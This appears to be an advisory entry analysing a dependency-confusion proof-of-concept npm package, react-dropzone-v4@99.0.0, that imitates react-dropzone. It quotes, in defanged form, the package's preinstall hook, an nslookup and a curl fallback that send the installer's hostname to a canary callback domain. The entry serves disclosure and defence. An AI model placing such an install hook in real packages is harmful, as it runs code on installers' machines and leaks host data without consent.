details: This package is a dependency-confusion proof of concept. Its only file is a package.json whose preinstall lifecycle hook resolves and then requests a canary callback host with the installer's hostname embedded in the name: `nslookup $(hostname).hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com`, falling back to `curl hxxp://hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com/$(hostname)`. The package name and version (react-dropzone-v4@99.0.0) imitate the real react-dropzone package at an implausible major version, and the manifest describes itself as security research. The beacon transmits only the machine hostname — no environment variables, tokens, credential files, wallet data or file contents are read or sent, and there is no second-stage download or executed code beyond the hook itself. Installing the package does execute the hook, so the callback fires on install.
